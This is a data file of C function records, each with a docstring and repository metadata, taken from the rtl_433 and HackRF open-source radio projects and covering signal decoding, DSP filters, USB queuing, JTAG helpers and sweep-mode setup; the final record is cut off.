{"docstring": "/**\nProtocol of the SimpliSafe Sensors.\n@sa ss_sensor_parser() ss_pinentry_parser() ss_keypad_commands()\n*/\n", "func_signal": "static int\nss_sensor_callback(r_device *decoder, bitbuffer_t *bitbuffer)", "code": "{\n    // Require two identical rows.\n    int row = bitbuffer_find_repeated_row(bitbuffer, 2, 90);\n    if (row < 0)\n      return DECODE_ABORT_EARLY;\n\n    // The row must start with 0xcc5f (0x33a0 inverted).\n    uint8_t *b = bitbuffer->bb[row];\n    if (b[0] != 0xcc || b[1] != 0x5f)\n      return DECODE_ABORT_EARLY;\n\n    bitbuffer_invert(bitbuffer);\n\n    if (b[2] == 0x88) {\n        return ss_sensor_parser(decoder, bitbuffer, row);\n    } else if (b[2] == 0x66) {\n        return ss_pinentry_parser(decoder, bitbuffer, row);\n    } else if (b[2] == 0x44) {\n        return ss_keypad_commands(decoder, bitbuffer, row);\n    } else {\n        if (decoder->verbose)\n            fprintf(stderr, \"Unknown Message Type: %02x\\n\", b[2]);\n        return DECODE_ABORT_EARLY;\n    }\n}", "path": "rtl_433/src/devices/simplisafe.c", "commit_date": "2020-09-05 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// 122/128, 51/128 Magnitude Estimator for CU8 (SIMD has min/max).\n/// Note that magnitude emphasizes quiet signals / deemphasizes loud signals.\n", "func_signal": "void magnitude_est_cu8(uint8_t const *iq_buf, uint16_t *y_buf, uint32_t len)", "code": "{\n    unsigned long i;\n    for (i = 0; i < len; i++) {\n        uint16_t x = abs(iq_buf[2 * i] - 128);\n        uint16_t y = abs(iq_buf[2 * i + 1] - 128);\n        uint16_t mi = x < y ? x : y;\n        uint16_t mx = x > y ? x : y;\n        uint16_t mag_est = 122 * mx + 51 * mi;\n        y_buf[i] = mag_est; // max 22144, fs 16384\n    }\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/** Something that might look like a IIR lowpass filter.\n\n    [b,a] = butter(1, Wc) # low pass filter with cutoff pi*Wc radians\n    - Q1.15*Q15.0 = Q16.15\n    - Q16.15>>1 = Q15.14\n    - Q15.14 + Q15.14 + Q15.14 could possibly overflow to 17.14\n    - but the b coeffs are small so it wont happen\n    - Q15.14>>14 = Q15.0\n*/\n", "func_signal": "void baseband_low_pass_filter(uint16_t const *x_buf, int16_t *y_buf, uint32_t len, filter_state_t *state)", "code": "{\n    ///  [b,a] = butter(1, 0.01) -> 3x tau (95%) ~100 samples\n    //static int const a[FILTER_ORDER + 1] = {FIX(1.00000), FIX(0.96907)};\n    //static int const b[FILTER_ORDER + 1] = {FIX(0.015466), FIX(0.015466)};\n    ///  [b,a] = butter(1, 0.05) -> 3x tau (95%) ~20 samples\n    static int const a[FILTER_ORDER + 1] = {FIX(1.00000), FIX(0.85408)};\n    static int const b[FILTER_ORDER + 1] = {FIX(0.07296), FIX(0.07296)};\n\n    unsigned long i;\n    // TODO: Will Segmentation Fault if len < FILTERORDER\n\n    /* Calculate first sample */\n    y_buf[0] = ((a[1] * state->y[0] >> 1) + (b[0] * x_buf[0] >> 1) + (b[1] * state->x[0] >> 1)) >> (F_SCALE - 1);\n    for (i = 1; i < len; i++) {\n        y_buf[i] = ((a[1] * y_buf[i - 1] >> 1) + (b[0] * x_buf[i] >> 1) + (b[1] * x_buf[i - 1] >> 1)) >> (F_SCALE - 1);\n    }\n\n    /* Save last samples */\n    memcpy(state->x, &x_buf[len - FILTER_ORDER], FILTER_ORDER * sizeof (int16_t));\n    memcpy(state->y, &y_buf[len - FILTER_ORDER], FILTER_ORDER * sizeof (int16_t));\n    //fprintf(stderr, \"%d\\n\", y_buf[0]);\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// for evaluation.\n", "func_signal": "void baseband_demod_FM_cs16(int16_t const *x_buf, int16_t *y_buf, unsigned long num_samples, demodfm_state_t *state, unsigned fpdm)", "code": "{\n    UNUSED(fpdm);\n    ///  [b,a] = butter(1, 0.1) -> 3x tau (95%) ~10 samples\n    //static int const alp[2] = {FIX32(1.00000), FIX32(0.72654)};\n    //static int const blp[2] = {FIX32(0.13673), FIX32(0.13673)};\n    ///  [b,a] = butter(1, 0.2) -> 3x tau (95%) ~5 samples\n    static int64_t const alp[2] = {FIX32(1.00000), FIX32(0.50953)};\n    static int64_t const blp[2] = {FIX32(0.24524), FIX32(0.24524)};\n\n    int32_t ar, ai;  // New IQ sample: x[n]\n    int32_t br, bi;  // Old IQ sample: x[n-1]\n    int64_t pr, pi;  // Phase difference vector\n    int32_t xlp, ylp, xlp_old, ylp_old;  // Low Pass filter variables\n\n    // Pre-feed old sample\n    ar = state->br; ai = state->bi;\n    xlp_old = state->xlp; ylp_old = state->ylp;\n\n    for (unsigned n = 0; n < num_samples; n++) {\n        // delay old sample\n        br = ar;\n        bi = ai;\n        // get new sample\n        ar = x_buf[2*n];\n        ai = x_buf[2*n+1];\n        // Calculate phase difference vector: x[n] * conj(x[n-1])\n        pr = (int64_t)ar*br + (int64_t)ai*bi;  // May exactly overflow an int32_t (-32768*-32768 + -32768*-32768)\n        pi = (int64_t)ai*br - (int64_t)ar*bi;\n//        xlp = (int32_t)((atan2f(pi, pr) / M_PI) * INT32_MAX);    // Floating point implementation\n        xlp = atan2_int32(pi, pr);  // Integer implementation\n//        xlp = atan2_int16(pi>>16, pr>>16) << 16;  // Integer implementation\n//        xlp = pi;                    // Cheat and use only imaginary part (works OK, but is amplitude sensitive)\n        // Low pass filter\n        ylp = (alp[1] * ylp_old + blp[0] * xlp + blp[1] * xlp_old) >> F_SCALE32;\n        ylp_old = ylp; xlp_old = xlp;\n        y_buf[n] = ylp >> 16; // not really losing info here, maybe optimize earlier\n    }\n\n    // Store newest sample for next run\n    state->br = ar; state->bi = ai;\n    state->xlp = xlp_old; state->ylp = ylp_old;\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "///   decoding resumes.\n///\n/// - The one or two alike contiguous symbols immediately after a sync are not treated\n///   as data, they are essentially there to signify the end of the sync.\n///\n/// Return value is length of data decoded into bitrow_buf after last sync. If bitrow\n/// ends with a sync, that sync is ignored and returned data will be data before that\n/// sync.\n///\n/// Ensure that bitrow_buf is at least as big as bitrow or data overrun might occur.\n///\n/// Note that sync_pos and sync_len will be modified if a sync is found. If returned\n/// sync_pos is greater than start, it might mean there is data between start and\n/// sync_pos.  If desired, call again with bit_len = sync_pos to find this data.\n///\n/// Maybe this can graduate to bitbuffer.c someday?\n", "func_signal": "unsigned bitrow_dpwm_decode(bitrow_t const bitrow, unsigned bit_len, unsigned start,\n        bitrow_t bitrow_buf, unsigned *sync_pos, unsigned *sync_len)", "code": "{\n    unsigned bitrow_pos;\n    int bitrow_buf_pos          = -1;\n    unsigned cur_symbol_len     = -1;\n    *sync_pos                   = start;\n    *sync_len                   = 0;\n    unsigned sync_in_progress   = 1;\n    unsigned prev_bit           = 0xff;  // So it's always different than the first bit\n    unsigned this_bit;\n\n    for (bitrow_pos = start; bitrow_pos < bit_len; bitrow_pos++) {\n        this_bit = bitrow_get_bit(bitrow, bitrow_pos);\n        if (this_bit == prev_bit) {\n            if (++cur_symbol_len > 1) {\n                sync_in_progress = 1;\n            }\n        }\n        else {\n            if (sync_in_progress) {\n                *sync_len = cur_symbol_len + 1;\n                *sync_pos = bitrow_pos - cur_symbol_len - 1;\n                bitrow_buf_pos = -1;\n                sync_in_progress = 0;\n            }\n            else {\n                if (bitrow_buf_pos >= 0) {\n                    bitrow_set_bit(bitrow_buf, bitrow_buf_pos, cur_symbol_len);\n                }\n                bitrow_buf_pos++;\n            }\n            cur_symbol_len = 0;\n        }\n        prev_bit = this_bit;\n    }\n\n    // If a sync was started at the end of the row, ignore it and the previous decoded bit\n    if (sync_in_progress) {\n        bitrow_buf_pos -= 1;\n    }\n\n    // If bad decode, just send back an empty result string.\n    if (bitrow_buf_pos < 0) {\n        bitrow_buf_pos = 0;\n    }\n\n    return bitrow_buf_pos;\n}", "path": "rtl_433/src/devices/directv.c", "commit_date": "2020-08-05 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// This will give a noisy envelope of OOK/ASK signals.\n/// Subtracts the bias (-128) and calculates the norm (scaled by 16384).\n/// Using a LUT is slower for O1 and above.\n", "func_signal": "void envelope_detect_nolut(uint8_t const *iq_buf, uint16_t *y_buf, uint32_t len)", "code": "{\n    unsigned long i;\n    for (i = 0; i < len; i++) {\n        int16_t x = 127 - iq_buf[2 * i];\n        int16_t y = 127 - iq_buf[2 * i + 1];\n        y_buf[i]  = x * x + y * y; // max 32768, fs 16384\n    }\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/**\n * Creates a new parser based over a given  buffer with an array of tokens\n * available.\n */\n", "func_signal": "void jsmn_init(jsmn_parser *parser)", "code": "{\n\tparser->pos = 0;\n\tparser->toknext = 0;\n\tparser->toksuper = -1;\n}", "path": "rtl_433/src/jsmn.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/**\n * Allocates a fresh unused token from the token pool.\n */\n", "func_signal": "static jsmntok_t *jsmn_alloc_token(jsmn_parser *parser,\n\t\tjsmntok_t *tokens, size_t num_tokens)", "code": "{\n\tjsmntok_t *tok;\n\tif (parser->toknext >= num_tokens) {\n\t\treturn NULL;\n\t}\n\ttok = &tokens[parser->toknext++];\n\ttok->start = tok->end = -1;\n\ttok->size = 0;\n#ifdef JSMN_PARENT_LINKS\n\ttok->parent = -1;\n#endif\n\treturn tok;\n}", "path": "rtl_433/src/jsmn.c", "commit_date": "2020-11-10 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// for evaluation.\n", "func_signal": "static int32_t atan2_int32(int32_t y, int32_t x)", "code": "{\n    static int64_t const I_PI_4 = INT32_MAX / 4;          // M_PI/4\n    static int64_t const I_3_PI_4 = 3ll * INT32_MAX / 4;  // 3*M_PI/4\n\n    int64_t const abs_y = abs(y);\n    int64_t angle;\n\n    if (x >= 0) { // Quadrant I and IV\n        int64_t denom = (abs_y + x);\n        if (denom == 0) denom = 1; // Prevent divide by zero\n        angle = I_PI_4 - I_PI_4 * (x - abs_y) / denom;\n    } else { // Quadrant II and III\n        int64_t denom = (abs_y - x);\n        if (denom == 0) denom = 1; // Prevent divide by zero\n        angle = I_3_PI_4 - I_PI_4 * (x + abs_y) / denom;\n    }\n    if (y < 0) angle = -angle; // Negate if in III or IV\n    return angle;\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// True Magnitude for CU8 (sqrt can SIMD but float is slow).\n", "func_signal": "void magnitude_true_cu8(uint8_t const *iq_buf, uint16_t *y_buf, uint32_t len)", "code": "{\n    unsigned long i;\n    for (i = 0; i < len; i++) {\n        int16_t x = iq_buf[2 * i] - 128;\n        int16_t y = iq_buf[2 * i + 1] - 128;\n        y_buf[i]  = sqrt(x * x + y * y) * 128.0; // max 181, scaled 23170, fs 16384\n    }\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/// precalculate lookup table for envelope detection.\n", "func_signal": "static void calc_squares()", "code": "{\n    int i;\n    for (i = 0; i < 256; i++)\n        scaled_squares[i] = (127 - i) * (127 - i);\n}", "path": "rtl_433/src/baseband.c", "commit_date": "2020-11-03 00:00:00", "repo_name": "merbanan/rtl_433", "stars": 5606, "license": "gpl-2.0", "language": "c", "size": 8519}
{"docstring": "/* TODO: Why is CS being controlled manually when SSP0 could do it\n * automatically?\n */\n", "func_signal": "void w25q80bv_target_init(w25q80bv_driver_t* const drv)", "code": "{\n\t(void)drv;\n\n\t/* Init SPIFI GPIO to Normal GPIO */\n\tscu_pinmux(P3_3, (SCU_SSP_IO | SCU_CONF_FUNCTION2));    // P3_3 SPIFI_SCK => SSP0_SCK\n\tscu_pinmux(P3_4, (SCU_GPIO_FAST | SCU_CONF_FUNCTION0)); // P3_4 SPIFI SPIFI_SIO3 IO3 => GPIO1[14]\n\tscu_pinmux(P3_5, (SCU_GPIO_FAST | SCU_CONF_FUNCTION0)); // P3_5 SPIFI SPIFI_SIO2 IO2 => GPIO1[15]\n\tscu_pinmux(P3_6, (SCU_GPIO_FAST | SCU_CONF_FUNCTION0)); // P3_6 SPIFI SPIFI_CIPO IO1 => GPIO0[6]\n\tscu_pinmux(P3_7, (SCU_GPIO_FAST | SCU_CONF_FUNCTION4)); // P3_7 SPIFI SPIFI_COPI IO0 => GPIO5[10]\n\tscu_pinmux(P3_8, (SCU_GPIO_FAST | SCU_CONF_FUNCTION4)); // P3_8 SPIFI SPIFI_CS => GPIO5[11]\n\t\n\t/* configure SSP pins */\n\tscu_pinmux(SCU_SSP0_CIPO, (SCU_SSP_IO | SCU_CONF_FUNCTION5));\n\tscu_pinmux(SCU_SSP0_COPI, (SCU_SSP_IO | SCU_CONF_FUNCTION5));\n\tscu_pinmux(SCU_SSP0_SCK,  (SCU_SSP_IO | SCU_CONF_FUNCTION2));\n\n\t/* configure GPIO pins */\n\tscu_pinmux(SCU_FLASH_HOLD, SCU_GPIO_FAST);\n\tscu_pinmux(SCU_FLASH_WP, SCU_GPIO_FAST);\n\tscu_pinmux(SCU_SSP0_CS, (SCU_GPIO_FAST | SCU_CONF_FUNCTION4));\n\n\t/* drive CS, HOLD, and WP pins high */\n\tgpio_set(drv->gpio_hold);\n\tgpio_set(drv->gpio_wp);\n\n\t/* Set GPIO pins as outputs. */\n\tgpio_output(drv->gpio_hold);\n\tgpio_output(drv->gpio_wp);\n}", "path": "hackrf/firmware/common/w25q80bv_target.c", "commit_date": "2020-07-03 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "// Schedule an already filled-in transfer descriptor for execution on\n// the given endpoint, waiting until the endpoint has finished.\n", "func_signal": "void usb_endpoint_schedule_wait(\n\tconst usb_endpoint_t* const endpoint,\n\tusb_transfer_descriptor_t* const td\n)", "code": "{\n\t// Ensure that endpoint is ready to be primed.\n\t// It may have been flushed due to an aborted transaction.\n\t// TODO: This should be preceded by a flush?\n\twhile( usb_endpoint_is_ready(endpoint) );\n\n\ttd->next_dtd_pointer = USB_TD_NEXT_DTD_POINTER_TERMINATE;\n\n\tusb_endpoint_prime(endpoint, td);\n}", "path": "hackrf/firmware/common/usb.c", "commit_date": "2017-02-03 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* Write to one of the PCA9557 registers */\n", "func_signal": "void operacake_write_reg(i2c_bus_t* const bus, uint8_t address, uint8_t reg, uint8_t value)", "code": "{\n\tconst uint8_t data[] = {reg, value};\n\ti2c_bus_transfer(bus, address, data, 2, NULL, 0);\n}", "path": "hackrf/firmware/common/operacake.c", "commit_date": "2019-02-01 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*\nstatic bool usb_endpoint_is_flushing(\n\tconst usb_endpoint_t* const endpoint\n) {\n\tconst uint_fast8_t endpoint_number = usb_endpoint_number(endpoint->address);\n\tif( usb_endpoint_is_in(endpoint->address) ) {\n\t\treturn USB0_ENDPTFLUSH & USB0_ENDPTFLUSH_FETB(1 << endpoint_number);\n\t} else {\n\t\treturn USB0_ENDPTFLUSH & USB0_ENDPTFLUSH_FERB(1 << endpoint_number);\n\t}\n}\n*/\n", "func_signal": "bool usb_endpoint_is_ready(\n\tconst usb_endpoint_t* const endpoint\n)", "code": "{\n\tconst uint_fast8_t endpoint_number = usb_endpoint_number(endpoint->address);\n\tif( usb_endpoint_is_in(endpoint->address) ) {\n\t\treturn USB0_ENDPTSTAT & USB0_ENDPTSTAT_ETBR(1 << endpoint_number);\n\t} else {\n\t\treturn USB0_ENDPTSTAT & USB0_ENDPTSTAT_ERBR(1 << endpoint_number);\n\t}\n}", "path": "hackrf/firmware/common/usb.c", "commit_date": "2017-02-03 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* toggle tck LH.  No need to modify this code.  It is output via setPort. */\n", "func_signal": "void pulseClock(jtag_gpio_t* const gpio)", "code": "{\n    setPort(gpio, TCK,0);  /* set the TCK port to low  */\n\tdelay_jtag(200);\n    setPort(gpio, TCK,1);  /* set the TCK port to high */\n\tdelay_jtag(200);\n}", "path": "hackrf/firmware/common/xapp058/ports.c", "commit_date": "2014-11-16 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*****************************************************************************\n* Function:     EqualLenVal\n* Description:  Compare two lenval arrays with an optional mask.\n* Parameters:   plvTdoExpected  - ptr to lenval #1.\n*               plvTdoCaptured  - ptr to lenval #2.\n*               plvTdoMask      - optional ptr to mask (=0 if no mask).\n* Returns:      short   - 0 = mismatch; 1 = equal.\n*****************************************************************************/\n", "func_signal": "short EqualLenVal( lenVal*  plvTdoExpected,\n                   lenVal*  plvTdoCaptured,\n                   lenVal*  plvTdoMask )", "code": "{\n    short           sEqual;\n\tshort           sIndex;\n    unsigned char   ucByteVal1;\n    unsigned char   ucByteVal2;\n    unsigned char   ucByteMask;\n\n    sEqual  = 1;\n    sIndex  = plvTdoExpected->len;\n\n    while ( sEqual && sIndex-- )\n    {\n        ucByteVal1  = plvTdoExpected->val[ sIndex ];\n        ucByteVal2  = plvTdoCaptured->val[ sIndex ];\n        if ( plvTdoMask )\n        {\n            ucByteMask  = plvTdoMask->val[ sIndex ];\n            ucByteVal1  &= ucByteMask;\n            ucByteVal2  &= ucByteMask;\n        }\n        if ( ucByteVal1 != ucByteVal2 )\n        {\n            sEqual  = 0;\n        }\n    }\n\n\treturn( sEqual );\n}", "path": "hackrf/firmware/common/xapp058/lenval.c", "commit_date": "2013-02-14 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* Add a transfer to the end of an endpoint's queue. Returns the old\n * tail or NULL is the queue was empty\n */\n", "func_signal": "static usb_transfer_t* endpoint_queue_transfer(\n        usb_transfer_t* const transfer\n)", "code": "{\n        usb_queue_t* const queue = transfer->queue;\n        transfer->next = NULL;\n        if (queue->active != NULL) {\n            usb_transfer_t* t = queue->active;\n            while (t->next != NULL) t = t->next;\n            t->next = transfer;\n            return t;\n        } else {\n            queue->active = transfer;\n            return NULL;\n        }\n}", "path": "hackrf/firmware/common/usb_queue.c", "commit_date": "2013-09-17 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* Called when an endpoint might have completed a transfer */\n", "func_signal": "void usb_queue_transfer_complete(usb_endpoint_t* const endpoint)", "code": "{\n        usb_queue_t* const queue = endpoint_queue(endpoint);\n        if (queue == NULL) while(1); // Uh oh\n        usb_transfer_t* transfer = queue->active;\n\n        while (transfer != NULL) {\n                uint8_t status = transfer->td.total_bytes;\n\n                // Check for failures\n                if (   status & USB_TD_DTD_TOKEN_STATUS_HALTED\n                    || status & USB_TD_DTD_TOKEN_STATUS_BUFFER_ERROR\n                    || status & USB_TD_DTD_TOKEN_STATUS_TRANSACTION_ERROR) {\n                        // TODO: Uh oh, do something useful here\n                        while (1);\n                }\n\n                // Still not finished\n                if (status & USB_TD_DTD_TOKEN_STATUS_ACTIVE) \n                        break;\n\n                // Advance the head. We need to do this before invoking the completion\n                // callback as it might attempt to schedule a new transfer\n                queue->active = transfer->next;\n                usb_transfer_t* next = transfer->next;\n\n                // Invoke completion callback\n                unsigned int total_bytes = (transfer->td.total_bytes & USB_TD_DTD_TOKEN_TOTAL_BYTES_MASK) >> USB_TD_DTD_TOKEN_TOTAL_BYTES_SHIFT;\n                unsigned int transferred = transfer->maximum_length - total_bytes;\n                if (transfer->completion_cb)\n                        transfer->completion_cb(transfer->user_data, transferred);\n\n                // Advance head and free transfer\n                free_transfer(transfer);\n                transfer = next;\n        }\n}", "path": "hackrf/firmware/common/usb_queue.c", "commit_date": "2013-09-17 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*****************************************************************************\n* Function:     SetBit\n* Description:  set the (byte, bit) of lv equal to val\n* Example:      SetBit(\"00000000\",byte, 1) equals \"01000000\".\n* Parameters:   plv     - ptr to lenval.\n*               iByte   - the byte to get the bit from.\n*               iBit    - the bit number (0=msb).\n*               sVal    - the bit value to set.\n* Returns:      void.\n*****************************************************************************/\n", "func_signal": "void SetBit( lenVal*    plv,\n             int        iByte,\n             int        iBit,\n             short      sVal )", "code": "{\n    unsigned char   ucByteVal;\n    unsigned char   ucBitMask;\n\n    ucBitMask   = (unsigned char)(1 << ( 7 - iBit ));\n    ucByteVal   = (unsigned char)(plv->val[ iByte ] & (~ucBitMask));\n\n    if ( sVal )\n    {\n        ucByteVal   |= ucBitMask;\n    }\n    plv->val[ iByte ]   = ucByteVal;\n}", "path": "hackrf/firmware/common/xapp058/lenval.c", "commit_date": "2013-02-14 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* Allocate a transfer */\n", "func_signal": "static usb_transfer_t* allocate_transfer(\n        usb_queue_t* const queue\n)", "code": "{\n        bool aborted;\n        usb_transfer_t* transfer;\n        if (queue->free_transfers == NULL)\n                return NULL;\n\n        do {\n                transfer = (void *) __ldrex((uint32_t *) &queue->free_transfers);\n                aborted = __strex((uint32_t) transfer->next, (uint32_t *) &queue->free_transfers);\n        } while (aborted);\n        transfer->next = NULL;\n        return transfer;\n}", "path": "hackrf/firmware/common/usb_queue.c", "commit_date": "2013-09-17 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*****************************************************************************\n* Function:     readVal\n* Description:  read from XSVF numBytes bytes of data into x.\n* Parameters:   plv         - ptr to lenval in which to put the bytes read.\n*               sNumBytes   - the number of bytes to read.\n* Returns:      void.\n*****************************************************************************/\n", "func_signal": "void readVal( lenVal*   plv,\n              short     sNumBytes )", "code": "{\n    unsigned char*  pucVal;\n\t\n    plv->len    = sNumBytes;        /* set the length of the lenVal        */\n    for ( pucVal = plv->val; sNumBytes; --sNumBytes, ++pucVal )\n    {\n        /* read a byte of data into the lenVal */\n\t\treadByte( pucVal );\n    }\n}", "path": "hackrf/firmware/common/xapp058/lenval.c", "commit_date": "2013-02-14 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "// Schedule an already filled-in transfer descriptor for execution on\n// the given endpoint, appending to the end of the endpoint's queue if\n// there are pending TDs. Note that this requires that one knows the\n// tail of the endpoint's TD queue. Moreover, the user is responsible\n// for setting the TERMINATE bit of next_dtd_pointer if needed.\n", "func_signal": "void usb_endpoint_schedule_append(\n\tconst usb_endpoint_t* const endpoint,\n\tusb_transfer_descriptor_t* const tail_td,\n\tusb_transfer_descriptor_t* const new_td\n)", "code": "{\n\tbool done;\n\n\ttail_td->next_dtd_pointer = new_td;\n\n\tif (usb_endpoint_is_priming(endpoint)) {\n\t\treturn;\n\t}\n\n\tdo {\n\t\tUSB0_USBCMD_D |= USB0_USBCMD_D_ATDTW;\n\t\tdone = usb_endpoint_is_ready(endpoint);\n\t} while (!(USB0_USBCMD_D & USB0_USBCMD_D_ATDTW));\n\n\tUSB0_USBCMD_D &= ~USB0_USBCMD_D_ATDTW;\n\tif(!done) {\n\t\tusb_endpoint_prime(endpoint, new_td);\n\t}\n}", "path": "hackrf/firmware/common/usb.c", "commit_date": "2017-02-03 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*****************************************************************************\n* Function:     AddVal\n* Description:  add val1 to val2 and store in resVal;\n*               assumes val1 and val2  are of equal length.\n* Parameters:   plvResVal   - ptr to result.\n*               plvVal1     - ptr of addendum.\n*               plvVal2     - ptr of addendum.\n* Returns:      void.\n*****************************************************************************/\n", "func_signal": "void addVal( lenVal*    plvResVal,\n             lenVal*    plvVal1,\n             lenVal*    plvVal2 )", "code": "{\n\tunsigned char   ucCarry;\n    unsigned short  usSum;\n    unsigned short  usVal1;\n    unsigned short  usVal2;\n\tshort           sIndex;\n\t\n\tplvResVal->len  = plvVal1->len;         /* set up length of result */\n\t\n\t/* start at least significant bit and add bytes    */\n    ucCarry = 0;\n    sIndex  = plvVal1->len;\n    while ( sIndex-- )\n    {\n\t\tusVal1  = plvVal1->val[ sIndex ];   /* i'th byte of val1 */\n\t\tusVal2  = plvVal2->val[ sIndex ];   /* i'th byte of val2 */\n\t\t\n\t\t/* add the two bytes plus carry from previous addition */\n\t\tusSum   = (unsigned short)( usVal1 + usVal2 + ucCarry );\n\t\t\n\t\t/* set up carry for next byte */\n\t\tucCarry = (unsigned char)( ( usSum > 255 ) ? 1 : 0 );\n\t\t\n        /* set the i'th byte of the result */\n\t\tplvResVal->val[ sIndex ]    = (unsigned char)usSum;\n    }\n}", "path": "hackrf/firmware/common/xapp058/lenval.c", "commit_date": "2013-02-14 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* readTDOBit:  Implement to return the current value of the JTAG TDO signal.*/\n/* read the TDO bit from port */\n", "func_signal": "unsigned char readTDOBit(jtag_gpio_t* const gpio)", "code": "{\n\tdelay_jtag(2000);\n\treturn gpio_read(gpio->gpio_tdo);;\n}", "path": "hackrf/firmware/common/xapp058/ports.c", "commit_date": "2014-11-16 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/*****************************************************************************\n* Function:     value\n* Description:  Extract the long value from the lenval array.\n* Parameters:   plvValue    - ptr to lenval.\n* Returns:      long        - the extracted value.\n*****************************************************************************/\n", "func_signal": "long value( lenVal*     plvValue )", "code": "{\n\tlong    lValue;         /* result to hold the accumulated result */\n\tshort   sIndex;\n\n    lValue  = 0;\n\tfor ( sIndex = 0; sIndex < plvValue->len ; ++sIndex )\n\t{\n\t\tlValue <<= 8;                       /* shift the accumulated result */\n\t\tlValue |= plvValue->val[ sIndex];   /* get the last byte first */\n\t}\n\n\treturn( lValue );\n}", "path": "hackrf/firmware/common/xapp058/lenval.c", "commit_date": "2013-02-14 00:00:00", "repo_name": "greatscottgadgets/hackrf", "stars": 5992, "license": "gpl-2.0", "language": "c", "size": 49263}
{"docstring": "/* Do this before starting sweep mode with set_transceiver_mode(). */\n", "func_signal": "usb_request_status_t usb_vendor_request_init_sweep(\n\t\tusb_endpoint_t* const endpoint, const usb_transfer_stage_t stage)", "code": "{\n\tuint32_t num_bytes;\n\tint i;\n\tif (stage == USB_TRANSFER_STAGE_SETUP) {\n\t\tnum_bytes = (endpoint->setup.index << 16) | endpoint->setup.value;\n\t\tdwell_blocks = num_bytes / 0x4000;\n\t\tif(1 > dwell_blocks) {\n\t\t\treturn USB_REQUEST_STATUS_STALL;\n\t\t}\n\t\tnum_ranges = (endpoint->setup.length - 9) / (2 * sizeof(frequencies[0]));\n\t\tif((1 > num_ranges) || (MAX_RANGES < num_ranges)) {\n\t\t\treturn USB_REQUEST_STATUS_STALL;\n\t\t}\n\t\tusb_transfer_schedule_block(endpoint->out, &data,\n\t\t\t\tendpoint->setup.length, NULL, NULL);\n\t} else if (stage == USB_TRANSFER_STAGE_DATA) {\n\t\tstep_width = ((uint32_t)(data[3]) << 24) | ((uint32_t)(data[2]) << 16)\n\t\t\t\t| ((uint32_t)(data[1]) << 8) | data[0];\n\t\tif(1 > step_width) {\n\t\t\treturn USB_REQUEST_STATUS_STALL;\n\t\t}\n\t\toffset = ((uint32_t)(data[7]) << 24) | ((uint32_t)(data[6]) << 16)\n\t\t\t\t| ((uint32_t)(data[5]) << 8) | data[4];\n\t\tstyle = data[8];\n\t\tif(INTERLEAVED < style) {\n\t\t\treturn USB_REQUEST_STATUS_STALL;\n\t\t}\n\t\tfor(i=0; i<(num_ranges*2); i++) {\n\t\t\tfrequencies[i] = ((uint16_t)(data[10+i*2]) << 8) + data[9+i*2];\n\t\t}\n\t\tsweep_freq = (uint64_t)frequencies[0] * FREQ_GRANULARITY;\n\t\tset_freq(sweep_freq + offset);\n\t\tusb_transfer_schedule_ack(endpoint->in);\n\t}\n\treturn USB_REQUEST_STATUS_OK;\n}", "path": "hackrf/firmware/hackrf_usb/usb_api_sweep.c", "commit_date": "2020-02-11 00:00:00", "repo_name": 